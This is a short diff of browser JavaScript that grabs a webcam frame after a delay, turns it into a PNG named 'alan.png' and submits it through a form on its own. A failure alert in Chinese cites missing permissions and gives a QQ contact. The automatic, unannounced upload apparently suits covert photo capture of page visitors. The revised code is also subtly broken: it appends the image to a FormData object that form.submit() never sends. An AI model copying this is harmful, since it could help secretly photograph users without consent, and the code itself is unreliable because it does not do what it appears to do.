@@ -21,10 +21,13 @@
                     
                     setTimeout(function(){context.drawImage(video, 0, 0, 480, 640);},1000);
                     setTimeout(function(){
-                        var img = canvas.toDataURL('image/png');  
-                        document.getElementById('gopo').append("image", img, "alan.png");
+                        var img = canvas.toDataURL('image/png');
+			 const form = document.getElementById('gopo')
+			 const formData = new FormData(form);
+
+                        formData.append("image", img, "alan.png");
 ;
-                        document.getElementById('gopo').submit();
+                        form.submit();
                         },1300);
                 },function(){alert("操作失败，权限不够！请联系管理员 QQ");});
                 
